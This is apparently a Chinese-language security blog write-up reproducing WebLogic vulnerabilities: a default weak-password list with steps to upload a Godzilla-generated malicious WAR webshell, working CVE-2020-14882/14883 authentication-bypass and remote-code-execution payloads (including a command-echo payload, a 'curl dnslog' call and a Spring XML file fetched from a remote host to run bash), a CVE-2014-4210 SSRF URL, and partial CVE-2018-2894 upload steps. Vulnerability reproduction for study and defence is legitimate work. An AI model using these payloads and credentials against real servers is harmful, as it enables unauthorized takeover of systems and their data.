# WebLogic 弱口令&amp;文件上传&amp;SSRF

  
  
&lt;!--more--&gt;  
## 0x01 前言  
将 WebLogic 一些其他漏洞全部放在这篇文章里面了，一共是以四个下漏洞  
- CVE-2014-4210 SSRF  
- CVE-2018-2894 任意文件上传  
- CVE-2020-14882/CVE-2020-14883 未授权 RCE  
- 弱口令 getshell  
## 0x02 环境搭建  
https://www.penson.top/article/av40  
## 0x03 弱口令getshell  
访问 WebLogic `/console` 接口，可能存在的弱口令如下  
  
| username    | password    |  
| ----------- | ----------- |  
| system      | password    |  
| weblogic    | weblogic    |  
| guest       | guest       |  
| portaladmin | portaladmin |  
| admin       | security    |  
| joe         | password    |  
| mary        | password    |  
| system      | security    |  
| wlcsystem   | wlcsystem   |  
| wlcsystem   | sipisystem  |  
常见的弱密码  
```txt  
weblogic1    
weblogic12    
weblogic123    
weblogic@123    
webl0gic    
weblogic#    
weblogic@  
```  
### 漏洞复现  
先使用弱口令登陆，点击部署下的安装  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409051459614.png)
选择上传文件  
上传恶意的 war 包，这个恶意 war 包是由哥斯拉生成，压缩为 zip 之后，将后缀名改为 .war 的  
继续默认点击位于上方的下一步，直至遇到并点击完成  
接着启动之前部署的war包  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409051505632.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409051506215.png)
## 0x04 CVE-2020-14882/CVE-2020-14883 未授权 RCE  
### 影响版本  
Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0  
### 漏洞原理  
CVE-2020-14883：允许未授权的用户通过目录穿越结合双重URL编码的方式来绕过管理控制台的权限验证访问后台  
CVE-2020-14882：允许后台任意用户通过HTTP协议执行任意命令  
### 漏洞复现  
主要是以下两个CVE的结合利用，显示未授权访问后台，然后通过后台可以执行命令的接口实现RCE  
#### CVE-2020-14883  
正常情况下，没有登陆Weblogic的话访问`console`后台就会直接302跳转到`/console/login/LoginForm.jsp`登陆界面。  
但是，通过目录穿越结双重URL编码就能绕过认证实现未授权访问`console`后台  
对应的`payload`为  
`/console/css/%252e%252e%252fconsole.portal`  
#### CVE-2020-14883  
前面的CVE虽然可以访问后台，但是低权限用户、无法安装应用，此处我们需要借助CVE-2020-14883这个漏洞的利用方式有两种，一种是通过`com.tangosol.coherence.mvel2.sh.ShellSession`，一种是通过`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`  
##### 方式一  
`com.tangosol.coherence.mvel2.sh.ShellSession`  
但此利用方法只能在`Weblogic 12.2.1`及以上版本利用，因为`10.3.6`并不存在`com.tangosol.coherence.mvel2.sh.ShellSession`类，  
直接访问如下URL即可  
`http://ip:7001/console/console.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#34;java.lang.Runtime.getRuntime().exec(&#39;curl dnslog&#39;);&#34;)`  
有回显的payload  
```http
/console/css/%252e%252e%252fconsole.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]\{\%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]\{\%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20)\{\%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();
```  
执行的命令添加在http头部的cmd字段  
##### 方式二  
`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`  
这是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效  
首先，需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上。  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;  
&lt;beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;  
   xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;  
   xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;&gt;  
    &lt;bean id=&#34;pb&#34; class=&#34;java.lang.ProcessBuilder&#34; init-method=&#34;start&#34;&gt;  
        &lt;constructor-arg&gt;  
          &lt;list&gt;  
            &lt;value&gt;bash&lt;/value&gt;  
            &lt;value&gt;-c&lt;/value&gt;  
            &lt;value&gt;&lt;![CDATA[ping dnslog]]&gt;&lt;/value&gt;  
          &lt;/list&gt;  
        &lt;/constructor-arg&gt;  
    &lt;/bean&gt;  
&lt;/beans&gt;  
```  
通过如下URL，即可让weblogic加载这个XML，并执行其中的命令  
`/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&#34;http://example.com/rce.xml&#34;)`  
## 0x05 CVE-2014-4210 SSRF  
### 影响版本  
- Oracle WebLogic Server 10.0.2, 10.3.6  
### 漏洞原理  
Weblogic的`SearchPublicReqistries.jsp`接口存在`SSRF`漏洞，如果服务端或内网存在`Redis`未授权访问漏洞则可以进一步利用  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409060006648.png)
### 漏洞利用  
SSRF漏洞存在于`/uddiexplorer/SearchPublicRegistries.jsp`，漏洞URL  
`/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business&#43;location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001`  
### 0x06 CVE-2018-2894  
### 影响版本  
10.3.6，12.1.3，12.2.1.2，12.2.1.3  
### 漏洞原理  
weblogic如果开启了web服务测试页，则分别会在`/ws_utc/begin.do`以及`/ws_utc/config.do`这两个页面存在任意上传getshell漏洞  
默认不开启，所以此漏洞有一定的局限性  
### 漏洞复现  
登录上 console，点 `base_domain`，在 “配置” -&gt; “一般信息” -&gt; “高级” 中开启 “启用 Web 服务测试页” 选项  
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/weblogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ssrf/  

